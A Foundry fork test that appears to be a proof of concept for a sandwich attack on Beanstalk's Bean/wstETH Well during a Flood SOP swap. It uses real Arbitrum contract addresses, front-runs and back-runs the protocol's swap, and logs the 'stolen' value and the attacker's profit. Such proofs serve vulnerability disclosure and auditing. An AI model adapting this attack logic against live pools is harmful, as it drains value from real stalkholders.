// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IWell {
    function getReserves() external view returns (uint256[] memory);
    function swapFrom(
        IERC20 fromToken, IERC20 toToken, uint256 amountIn,
        uint256 minAmountOut, address recipient, uint256 deadline
    ) external returns (uint256 amountOut);
}

/// Fork test against the Bean/wstETH Well — the largest Beanstalk pool
/// at $18.6M TVL. This is where the real damage happens during Flood.
contract BeanWstEthSandwichTest is Test {

    address constant BEANSTALK   = 0xD1A0060ba708BC4BCD3DA6C37EFa8deDF015FB70;
    address constant BEAN        = 0xBEA0005B8599265D41256905A9B3073D397812E4;
    address constant WSTETH      = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant WELL_WSTETH = 0xBEa00BbE8b5da39a3F57824a1a13Ec2a8848D74F;
    uint256 constant FORK_BLOCK  = 440420446;
    uint256 constant WSTETH_USD  = 2387; // ~1.17 * $2040 ETH

    IWell  well  = IWell(WELL_WSTETH);
    IERC20 bean  = IERC20(BEAN);
    IERC20 wsteth = IERC20(WSTETH);

    address attacker  = makeAddr("attacker");
    address beanstalk = BEANSTALK;

    function setUp() public {
        vm.createSelectFork("https://arb1.arbitrum.io/rpc");
    }

    /// The core test: sandwich the SOP swap on the $18.6M Bean/wstETH pool.
    function test_wstEthPoolSandwich() public {
        uint256[] memory r = well.getReserves();
        uint256 beanRes = r[0];
        uint256 wstethRes = r[1];

        console.log("=== Bean/wstETH Well (the big pool) ===");
        console.log("bean reserve:    %s (%s Bean)", beanRes, beanRes / 1e6);
        console.log("wstETH reserve:  %s (%s.%s wstETH)", wstethRes, wstethRes / 1e18, (wstethRes % 1e18) / 1e16);
        console.log("pool value:      ~$%s", (wstethRes * WSTETH_USD * 2) / 1e18);

        // Realistic SOP: 1% of Bean reserve (conservative)
        uint256 sopBeans = beanRes * 1 / 100;
        console.log("sopBeans (1%%):   %s (%s Bean)", sopBeans, sopBeans / 1e6);

        // --- Fair SOP ---
        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL_WSTETH, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, wsteth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        console.log("");
        console.log("--- fair SOP ---");
        console.log("wstETH to stalkholders: %s (~$%s)", fairOut, fairOut * WSTETH_USD / 1e18);

        // --- Sandwiched SOP ---
        uint256 attackBean = beanRes * 15 / 100;
        deal(address(bean), attacker, attackBean);

        vm.startPrank(attacker);
        bean.approve(WELL_WSTETH, attackBean);
        uint256 attackWstethOut = well.swapFrom(
            bean, wsteth, attackBean, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL_WSTETH, sopBeans);
        uint256 attackedOut = well.swapFrom(
            bean, wsteth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        vm.startPrank(attacker);
        wsteth.approve(WELL_WSTETH, attackWstethOut);
        uint256 beanBack = well.swapFrom(
            wsteth, bean, attackWstethOut, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        uint256 loss = fairOut - attackedOut;
        uint256 lossPct = loss * 100 / fairOut;
        uint256 lossUsd = loss * WSTETH_USD / 1e18;
        uint256 fairUsd = fairOut * WSTETH_USD / 1e18;

        console.log("");
        console.log("--- attacked SOP ---");
        console.log("wstETH to stalkholders: %s (~$%s)", attackedOut, attackedOut * WSTETH_USD / 1e18);
        console.log("");
        console.log("--- damage ---");
        console.log("stalkholder wstETH loss: %s (~$%s)", loss, lossUsd);
        console.log("extraction rate:         %s%%", lossPct);
        console.log("fair value:              $%s", fairUsd);
        console.log("stolen value:            $%s", lossUsd);
        if (beanBack > attackBean) {
            console.log("attacker Bean profit:    %s (%s Bean)", beanBack - attackBean, (beanBack - attackBean) / 1e6);
        }

        assertLt(attackedOut, fairOut, "stalkholders receive less wstETH");
        assertGt(lossPct, 15, "meaningful extraction rate");
    }

    /// What happens at 5% SOP (larger Flood event)?
    function test_wstEthPool_5pctSop() public {
        uint256[] memory r = well.getReserves();
        uint256 beanRes = r[0];

        uint256 sopBeans = beanRes * 5 / 100;
        console.log("=== 5%% SOP on Bean/wstETH ===");
        console.log("sopBeans: %s (%s Bean)", sopBeans, sopBeans / 1e6);

        // Fair
        uint256 snap = vm.snapshotState();
        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL_WSTETH, sopBeans);
        uint256 fairOut = well.swapFrom(
            bean, wsteth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();
        vm.revertToState(snap);

        // Sandwiched
        uint256 attackBean = beanRes * 15 / 100;
        deal(address(bean), attacker, attackBean);
        vm.startPrank(attacker);
        bean.approve(WELL_WSTETH, attackBean);
        uint256 attackWstethOut = well.swapFrom(
            bean, wsteth, attackBean, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        deal(address(bean), beanstalk, sopBeans);
        vm.startPrank(beanstalk);
        bean.approve(WELL_WSTETH, sopBeans);
        uint256 attackedOut = well.swapFrom(
            bean, wsteth, sopBeans, 0, beanstalk, type(uint256).max
        );
        vm.stopPrank();

        vm.startPrank(attacker);
        wsteth.approve(WELL_WSTETH, attackWstethOut);
        uint256 beanBack = well.swapFrom(
            wsteth, bean, attackWstethOut, 0, attacker, type(uint256).max
        );
        vm.stopPrank();

        uint256 loss = fairOut - attackedOut;
        uint256 lossPct = loss * 100 / fairOut;

        console.log("fair wstETH out:   %s (~$%s)", fairOut, fairOut * WSTETH_USD / 1e18);
        console.log("attacked out:      %s (~$%s)", attackedOut, attackedOut * WSTETH_USD / 1e18);
        console.log("stolen:            %s (~$%s)", loss, loss * WSTETH_USD / 1e18);
        console.log("extraction:        %s%%", lossPct);
        if (beanBack > attackBean) {
            console.log("attacker profit:   %s Bean (%s)", beanBack - attackBean, (beanBack - attackBean) / 1e6);
        }

        assertLt(attackedOut, fairOut);
    }
}
